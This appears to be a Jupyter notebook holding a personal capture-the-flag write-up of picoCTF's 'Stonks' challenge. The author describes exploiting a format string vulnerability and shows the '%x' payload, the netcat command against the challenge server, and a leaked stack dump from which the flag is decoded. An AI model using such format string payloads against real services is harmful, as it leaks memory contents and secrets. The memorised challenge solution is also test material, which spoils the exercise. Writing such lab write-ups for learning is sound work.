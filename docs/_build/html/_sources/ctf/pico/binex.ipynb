{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Binary Exploitation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stonks\n",
    "\n",
    "Here you are given a file `vuln.c` and told that there is a bot to trade \"stonks\" using AI and ML. It looks to be  service listening on `mercury.picoctf.net 16439` that you can interact with via netcat (`nc`). Probably need to spend some time looking at `vuln.c` to see what is going on...\n",
    "\n",
    "Well, I somewhat quickly assertained what was going on (format string vulnerability), but I then proved to myself that __I had abosolutely no idea how to actually exploit__ or take advantage of it. I spent *way* too much time trying to figure things out. \n",
    "\n",
    "What I ended up doing was creating a file called `inputs` that looks like the following:\n",
    "\n",
    "```text\n",
    "1\n",
    "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x\n",
    "```\n",
    "\n",
    "This represents the two inputs I wanted to provide to the program. I then called the program as you would normally expect:\n",
    "\n",
    "```bash\n",
    "$ nc mercury.picoctf.net 16439 < inputs\n",
    "Welcome back to the trading app!\n",
    "\n",
    "What would you like to do?\n",
    "1) Buy some stonks!\n",
    "2) View my portfolio\n",
    "Using patented AI algorithms to buy stonks\n",
    "Stonks chosen\n",
    "What is your API token?\n",
    "Buying stonks with token:\n",
    "9aa0390804b00080489c3f7eecd80ffffffff19a9e160f7efa110f7eecdc709a9f18029aa03709aa03906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ff8a007d\n",
    "Portfolio as of Thu Oct 28 20:20:27 UTC 2021\n",
    "\n",
    "\n",
    "2 shares of I\n",
    "6 shares of WJ\n",
    "22 shares of W\n",
    "55 shares of ZCVR\n",
    "1903 shares of Z\n",
    "Goodbye!\n",
    "```\n",
    "\n",
    "I assumed that the flag would start with `picoCTF{` as most of them had, so I confirmed that I knew that the little-endian hex version of the start of that string was `6f636970`. I identified that portion in the byte string above, took from there to the end and dumped it into cyberchef. I then used a `swap endianness` tool complete with `from hex` and I had the flag.\n",
    "\n",
    "I made that *__way__* too difficult.\n",
    "\n",
    "One helpful line of code that I don't want to loose:\n",
    "\n",
    "```bash\n",
    "$ python3 -c \"print('%x'*30)\"\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.6 ('venv': venv)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.6"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "8fcf66f6e59375db85f6baa3058ecc2896497378edf6406cdc8f5354216bb4af"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
